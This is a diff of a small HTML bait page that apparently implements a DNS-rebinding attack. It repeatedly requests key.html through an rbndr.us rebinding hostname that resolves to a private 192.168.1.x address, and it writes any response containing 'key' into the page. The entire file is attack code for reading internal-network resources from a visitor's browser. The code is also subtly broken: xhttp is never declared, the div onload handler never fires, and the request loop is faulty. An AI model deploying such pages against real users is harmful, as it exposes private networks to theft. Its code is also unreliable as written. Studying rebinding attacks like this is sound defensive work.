@@ -1,27 +1,42 @@
-
 <html>
-  <head></head>
-  <body>
-    <button type="button" onclick="load()"> Send Request </button>
+<head>I am Bait</head>
+<body>
+	<div onload="load()"> This is a wannabe malicious-y test page running an onload script. </div>
+	<p id="reply"></p>
 
-    <p id="reply"></p>
+	<script>
+		function load() {
+			var foundIt = false;
+			var response = "";
+			var breakSwitch = 0;
 
-<script>
-function load() {
-	var xhttp = new XMLHttpRequest();
-	xhttp.onreadystatechange = function() {
-	  if (this.readyState == 4 && this.status == 200) {
-	    document.getElementById("reply").innerHTML = this.responseText;
-	  }
-	};
-	var data = "{}";
+			while(foundIt != true && breakSwitch < 50){
+					breakSwitch ++;
 
-	xhttp.open("GET", "http://a48a1f96.c0a80157.rbndr.us/index.html", true);
-	xhttp.setRequestHeader("Content-type", "text/plain");
-	//xhttp.send(data);
-  xhttp.send();
-}
-    </script>
+					xhttp.onreadystatechange = function() {
+							if (this.readyState == 4 && this.status == 200) {
+									console.log("here");
+									var response = this.responseText;
+									substring = "key";
+									if(response.indexOf(substring) !== -1){
+											document.getElementById("reply").innerHTML = response;
+											foundIt=true;
+											console.log("Found key!");
+									}else{
+											console.log("Key not found, retrying....");
+									}
+							}
+					};
 
-  </body>
+					//var data = "{}";
+					xhttp.open("GET", "http://a48a1f96.c0a80157.rbndr.us/key.html", true);
+					//xhttp.open("GET", "http://192.168.1.87/key.html", true);
+					xhttp.setRequestHeader("Content-type", "text/plain");
+					//xhttp.send(data);
+					console.log("Sending request!");
+			  		xhttp.send();
+			}
+		}
+	</script>
+</body>
 </html>
